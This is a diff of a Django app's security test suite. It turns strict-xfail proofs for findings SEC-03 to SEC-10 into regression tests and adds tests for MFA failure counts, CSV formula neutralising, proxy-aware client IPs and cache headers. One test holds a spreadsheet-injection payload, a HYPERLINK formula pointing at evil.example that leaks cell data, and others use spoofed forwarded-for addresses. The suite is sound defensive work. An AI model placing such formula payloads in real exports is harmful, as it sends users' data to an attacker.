@@ -3,15 +3,17 @@ Security review proofs (docs/security-review.md).
 
 Two kinds of test live here:
 
-* ``xfail(strict=True)`` — an executable proof for each exploitable finding (SEC-xx). Each
-  one asserts the *secure* behaviour, so it fails today and the suite stays green. When the
-  finding is fixed the test starts passing, strict xfail turns that into a failure, and the
-  marker must be removed: the proof becomes a regression test.
-* Plain tests — regression guards for controls that already work (CSRF, method restriction,
+* Finding proofs ``test_secNN_*``: one executable proof per exploitable finding from the
+  security review (SEC-01 … SEC-14). Each was first committed as ``xfail(strict=True)``
+  asserting the *secure* behaviour; each fix removed the marker, so every proof is now a
+  regression test that fails if the finding comes back. Further ``test_secNN_*`` tests pin
+  down the behaviour each fix introduced.
+* Regression guards for controls that worked from the start (CSRF, method restriction,
   IDOR → 404, security headers, lockout, MFA gating, demo login off, append-only audit,
   upload validation, output escaping, tenant isolation).
 
-Run:  TEST_DATABASE_NAME=test_edurev_sec python -m pytest tests/test_security.py -q
+A new finding is added the same way: a strict-xfail proof first, the marker removed with
+the fix. tests/test_malformed_input.py is the SEC-13 sweep across every page and form.
 """
 
 from __future__ import annotations
@@ -118,7 +120,7 @@ def _password_login(client, user, **extra):
 
 
 # ════════════════════════════════════════════════════════════════════════════
-#  Executable proofs of open findings (strict xfail: they flip when fixed)
+#  Finding proofs (each was a strict xfail until its fix landed)
 # ════════════════════════════════════════════════════════════════════════════
 
 
@@ -159,7 +161,6 @@ def test_sec02_student_critical_report_cannot_displace_other_bookings(
     assert room.status == "active"
 
 
-@pytest.mark.xfail(strict=True, reason="SEC-03: re-entering the password resets the MFA failure counter")
 def test_sec03_mfa_failures_survive_password_reentry(client, admin_user):
     secret = _enrol_mfa(admin_user)
     wrong = _wrong_code(secret)
@@ -214,7 +215,6 @@ def test_sec05_production_settings_refuse_default_secret_key(monkeypatch):
         runpy.run_path(str(BASE_DIR / "config" / "settings.py"))
 
 
-@pytest.mark.xfail(strict=True, reason="SEC-06: audit-log CSV export writes user text without formula neutralising")
 def test_sec06_audit_csv_export_neutralises_formulas(client, student, facility_manager, room):
     payload = '=HYPERLINK("https://evil.example/?x="&A1,"Open")'
     client.force_login(student)
@@ -227,14 +227,12 @@ def test_sec06_audit_csv_export_neutralises_formulas(client, student, facility_m
     assert not rows[0][5].startswith(("=", "+", "-", "@"))
 
 
-@pytest.mark.xfail(strict=True, reason="SEC-07: audit IP is taken from a client-supplied X-Forwarded-For")
 def test_sec07_audit_ip_is_not_client_controlled(client, student):
     _password_login(client, student, HTTP_X_FORWARDED_FOR="203.0.113.66")
     entry = AuditLog.objects.filter(action="auth.login", actor=student).latest("created_at")
     assert entry.ip != "203.0.113.66"
 
 
-@pytest.mark.xfail(strict=True, reason="SEC-08: quadratic-time regex in catalogue.search.parse on long ?q=")
 def test_sec08_find_query_parsing_is_bounded(client, student):
     client.force_login(student)
     client.get(reverse("catalogue:find"))  # warm up
@@ -243,7 +241,6 @@ def test_sec08_find_query_parsing_is_bounded(client, student):
     assert time.perf_counter() - started < 1.5
 
 
-@pytest.mark.xfail(strict=True, reason="SEC-09: MFA enrolment page (shows the TOTP secret) is cacheable")
 def test_sec09_mfa_enrolment_page_is_not_cacheable(client, admin_user):
     _password_login(client, admin_user)
     resp = client.get(reverse("accounts:mfa"))
@@ -251,7 +248,6 @@ def test_sec09_mfa_enrolment_page_is_not_cacheable(client, admin_user):
     assert "no-store" in resp.get("Cache-Control", "")
 
 
-@pytest.mark.xfail(strict=True, reason="SEC-09: the DPDP personal-data export is cacheable")
 def test_sec09_personal_data_export_is_not_cacheable(client, student):
     client.force_login(student)
     resp = client.get(reverse("accounts:export"))
@@ -259,7 +255,6 @@ def test_sec09_personal_data_export_is_not_cacheable(client, student):
     assert "no-store" in resp.get("Cache-Control", "")
 
 
-@pytest.mark.xfail(strict=True, reason="SEC-10: lockout message reveals that an account exists")
 def test_sec10_locked_and_unknown_accounts_answer_alike(client, student):
     student.locked_until = timezone.now() + timedelta(minutes=10)
     student.save(update_fields=["locked_until"])
@@ -576,6 +571,154 @@ def test_sec12_demo_stamp_is_void_once_demo_mode_is_off(client, settings, admin_
 def test_sec14_signed_in_users_can_read_the_api_schema(client, student, path):
     client.force_login(student)
     assert client.get(path).status_code == 200
+
+
+# ── SEC-03: one failure count across password re-entries ────────────────────
+
+
+def test_sec03_password_success_alone_does_not_clear_failures_of_an_mfa_user(client, admin_user):
+    User.objects.filter(pk=admin_user.pk).update(failed_logins=3)
+    _password_login(client, admin_user)
+    admin_user.refresh_from_db()
+    assert admin_user.failed_logins == 3
+
+
+def test_sec03_completing_mfa_clears_the_count(client, admin_user):
+    secret = _enrol_mfa(admin_user)
+    User.objects.filter(pk=admin_user.pk).update(failed_logins=3)
+    _password_login(client, admin_user)
+    client.post(reverse("accounts:mfa"), {"code": pyotp.TOTP(secret).now()})
+    admin_user.refresh_from_db()
+    assert admin_user.failed_logins == 0
+
+
+def test_sec03_users_without_mfa_still_reset_on_success(client, student):
+    User.objects.filter(pk=student.pk).update(failed_logins=3)
+    _password_login(client, student)
+    student.refresh_from_db()
+    assert student.failed_logins == 0
+
+
+# ── SEC-06: formula neutralising in every export ────────────────────────────
+
+
+@pytest.mark.parametrize(
+    "value,expected",
+    [("=1+1", "'=1+1"), ("+91 98", "'+91 98"), ("-x", "'-x"), ("@SUM(A1)", "'@SUM(A1)"), ("Room 1", "Room 1")],
+)
+def test_sec06_spreadsheet_safe(value, expected):
+    from apps.core.exports import spreadsheet_safe, unguard
+
+    assert spreadsheet_safe(value) == expected
+    assert unguard(spreadsheet_safe(value)) == value
+    assert spreadsheet_safe(None) == "" and spreadsheet_safe(3) == 3
+
+
+def test_sec06_timetable_export_is_guarded_and_still_round_trips(lpu, room, facility_manager):
+    from apps.timetable import services as timetable
+    from apps.timetable.models import AcademicTerm
+
+    term = AcademicTerm.objects.create(
+        institution=lpu,
+        code="T1",
+        name="Term 1",
+        starts=timezone.localdate(),
+        ends=timezone.localdate() + timedelta(days=90),
+    )
+    csv_text = (
+        "room_code,day,start,end,course_code,course_title\n" + f"{room.code},Monday,09:00,10:00,CSE101,=HYPERLINK(1)\n"
+    )
+    entries, errors = timetable.parse_rows(csv_text, lpu.pk)
+    assert not errors and entries[0].course_title == "=HYPERLINK(1)"
+    pub = timetable.stage(term, entries, actor=facility_manager)
+    exported = timetable.export_csv(pub)
+    assert ",'=HYPERLINK(1)" in exported
+    again, errors = timetable.parse_rows(exported, lpu.pk)
+    assert not errors and again[0].course_title == "=HYPERLINK(1)"
+
+
+# ── SEC-07: trusted proxies only ────────────────────────────────────────────
+
+
+def _request(remote="10.0.0.9", xff=None):
+    from django.test import RequestFactory
+
+    extra = {"REMOTE_ADDR": remote}
+    if xff is not None:
+        extra["HTTP_X_FORWARDED_FOR"] = xff
+    return RequestFactory().get("/", **extra)
+
+
+@pytest.mark.parametrize(
+    "hops,xff,expected",
+    [
+        (0, "203.0.113.66", "10.0.0.9"),  # no proxy declared: header ignored
+        (1, "203.0.113.66", "203.0.113.66"),  # one proxy: it appended the real client
+        (1, "6.6.6.6, 198.51.100.7", "198.51.100.7"),  # client-sent prefix is ignored
+        (2, "6.6.6.6, 198.51.100.7, 10.1.1.1", "198.51.100.7"),
+        (1, "not-an-ip", "10.0.0.9"),
+        (2, "198.51.100.7", "10.0.0.9"),  # fewer hops than declared: bypassed the proxies
+    ],
+)
+def test_sec07_client_ip_honours_trusted_proxy_hops(settings, hops, xff, expected):
+    from apps.core.http import client_ip
+
+    settings.TRUSTED_PROXY_HOPS = hops
+    assert client_ip(_request(xff=xff)) == expected
+
+
+def test_sec07_rate_limit_and_audit_share_the_client_address(settings):
+    assert settings.RATELIMIT_IP_META_KEY == "apps.core.http.client_ip"
+
+
+def test_sec07_behind_one_proxy_the_audit_records_the_real_client(client, settings, student):
+    settings.TRUSTED_PROXY_HOPS = 1
+    _password_login(client, student, HTTP_X_FORWARDED_FOR="6.6.6.6, 198.51.100.7")
+    assert AuditLog.objects.filter(action="auth.login", actor=student).latest("created_at").ip == "198.51.100.7"
+
+
+# ── SEC-08: bounded query parsing keeps its meaning ─────────────────────────
+
+
+def test_sec08_parse_still_understands_ordinary_queries():
+    from apps.catalogue import search
+
+    intent = search.parse("lab   for 40    after 3pm", today=timezone.localdate())
+    assert intent.capacity == 40 and intent.start is not None
+    assert len(search.parse("x" * 5000).text) <= search.MAX_QUERY_CHARS
+
+
+# ── SEC-09: secrets are never cached; personal pages never shared ───────────
+
+
+@pytest.mark.parametrize("name", ["accounts:me", "accounts:login"])
+def test_sec09_more_secret_pages_are_no_store(client, student, name):
+    if name != "accounts:login":
+        client.force_login(student)
+    assert "no-store" in client.get(reverse(name)).get("Cache-Control", "")
+
+
+def test_sec09_booking_pass_and_feed_are_no_store(client, student, booked):
+    client.force_login(student)
+    assert "no-store" in client.get(reverse("bookings:detail", args=[booked.reference])).get("Cache-Control", "")
+    feed = client.get(reverse("bookings:feed", args=[student.calendar_token]))
+    assert "no-store" in feed.get("Cache-Control", "")
+
+
+def test_sec09_signed_in_pages_are_private(client, student):
+    client.force_login(student)
+    assert "private" in client.get(reverse("core:home")).get("Cache-Control", "")
+
+
+# ── SEC-10: a lockout looks like any other failure ──────────────────────────
+
+
+def test_sec10_locked_account_refuses_even_the_right_password(client, student):
+    student.locked_until = timezone.now() + timedelta(minutes=10)
+    student.save(update_fields=["locked_until"])
+    resp = _password_login(client, student)
+    assert resp.status_code == 200 and "_auth_user_id" not in client.session
+    assert b"don&#x27;t match" in resp.content or b"don't match" in resp.content
 
 
 # ════════════════════════════════════════════════════════════════════════════
